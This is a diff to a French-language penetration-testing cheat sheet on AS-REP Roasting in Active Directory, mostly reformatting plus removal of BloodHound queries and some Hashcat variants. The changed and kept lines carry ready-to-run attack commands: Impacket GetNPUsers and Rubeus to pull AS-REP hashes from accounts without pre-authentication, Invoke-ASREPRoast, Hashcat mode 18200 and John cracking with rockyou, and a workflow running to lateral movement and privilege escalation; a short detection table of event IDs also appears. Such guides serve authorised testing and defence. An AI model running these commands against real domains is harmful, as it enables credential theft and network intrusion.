@@ -47,9 +47,9 @@ Normalement, Kerberos exige que l'utilisateur prouve son identité avant de rece
 
 ::: code-group
 ```bash [Impacket]
-# Sans compte — avec liste d'utilisateurs
+# Sans compte avec liste d'utilisateurs
 impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC> -outputfile hashes.txt
-# Avec compte du domaine — enum auto
+# Avec compte du domaine enum auto
 impacket-GetNPUsers domain.com/user:password -dc-ip <DC> -request -outputfile hashes.txt
 ```
 ```bash [NetExec]
@@ -63,15 +63,15 @@ Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
 :::
 
 
-##  Workflow 
-```
-1. Enumérer les comptes sans pré-authentification Kerberos
-2. Demander les AS-REP pour ces comptes
-3. Extraire les hashes krb5asrep
-4. Cracker les hashes hors ligne
-5. Utiliser les credentials récupérés
-6. Mouvement latéral / escalade de privilèges
-```
+ 
+:::details Workflow 
+ 1. Enumérer les comptes sans pré-authentification Kerberos
+ 2. Demander les AS-REP pour ces comptes
+ 3. Extraire les hashes krb5asrep
+ 4. Cracker les hashes hors ligne
+ 5. Utiliser les credentials récupérés
+ 6. Mouvement latéral / escalade de privilèges
+:::
 
 
 
@@ -100,22 +100,15 @@ ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
 # Ingestor
 bloodhound-python -u user -p password -d domain.com -dc <DC> -c all
 ```
-```
-# Requête Cypher — comptes AS-REP Roastables
-MATCH (u:User {dontreqpreauth:true}) RETURN u
 
-# Requête Cypher — AS-REP roastables avec chemin vers DA
-MATCH (u:User {dontreqpreauth:true}), (g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}),
-p=shortestPath((u)-[*1..]->(g)) RETURN p
-```
 
 ### PowerView (Windows)
 ```powershell
-# Lister les comptes sans pré-auth
-Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName, MemberOf
+ # Lister les comptes sans pré-auth
+ Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName, MemberOf
 
-# Via Active Directory module
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+ # Via Active Directory module
+ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
 ```
 
 
@@ -124,15 +117,15 @@ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequireP
 
 ### Méthode 1 Impacket GetNPUsers (sans compte)
 ```bash
-# Avec liste d'utilisateurs
-impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC>
-
 # Sauvegarder les hashes
 impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC> -outputfile hashes.txt
 
 # Format Hashcat explicite
 impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC> -format hashcat
 ```
+Exemple: 
+
+![asrep-impacket](asrep-impacket.png)
 
 ### Impacket GetNPUsers (avec compte)
 ```bash
@@ -165,8 +158,8 @@ Rubeus.exe asreproast /domain:domain.com /dc:<DC> /format:hashcat
 
 ### Invoke-ASREPRoast (PowerShell)
 ```powershell
-Import-Module .\Invoke-ASREPRoast.ps1
-Invoke-ASREPRoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt -Encoding ASCII
+ Import-Module .\Invoke-ASREPRoast.ps1
+ Invoke-ASREPRoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt -Encoding ASCII
 ```
 
 
@@ -175,9 +168,9 @@ Invoke-ASREPRoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.t
 
 ### Identifier le format du hash
 ```
-$krb5asrep$23$user@domain.com:...  →  RC4   →  Hashcat mode 18200
-$krb5asrep$17$user@domain.com:...  →  AES128 →  Hashcat mode 19800
-$krb5asrep$18$user@domain.com:...  →  AES256 →  Hashcat mode 19900
+ $krb5asrep$23$user@domain.com:...  →  RC4   →  Hashcat mode 18200
+ $krb5asrep$17$user@domain.com:...  →  AES128 →  Hashcat mode 19800
+ $krb5asrep$18$user@domain.com:...  →  AES256 →  Hashcat mode 19900
 ```
 
 ### Hashcat RC4 (mode 18200)
@@ -185,21 +178,11 @@ $krb5asrep$18$user@domain.com:...  →  AES256 →  Hashcat mode 19900
 hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-### Hashcat avec règles
-```bash
-hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule
-```
-
-### Hashcat bruteforce
-```bash
-hashcat -m 18200 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s
-```
-
 ### John the Ripper
 ```bash
 john hashes.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+
 
 
 
@@ -240,7 +223,7 @@ nxc ldap <DC> -u targetuser -p CrackedPassword --groups
 
 | Event ID | Description                                              |
 |----------|----------------------------------------------------------|
-| 4768     | TGT demandé — sans pré-auth = suspect                    |
+| 4768     | TGT demandé sans pré-auth = suspect                    |
 | 4625     | Echec d'authentification post-crack                      |
 | 4771     | Echec pré-authentification Kerberos                      |
 
@@ -317,9 +300,9 @@ nxc ldap <DC> -u targetuser -p CrackedPassword --groups
 
 ## 📚 Ressources
 
-- [HackTricks — AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
-- [The Hacker Recipes — AS-REP Roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
-- [PayloadsAllTheThings — AS-REP Roast](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#asreproast)
+- [HackTricks AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
+- [The Hacker Recipes AS-REP Roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
+- [PayloadsAllTheThings AS-REP Roast](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#asreproast)
 - [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
 - [Impacket GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
 
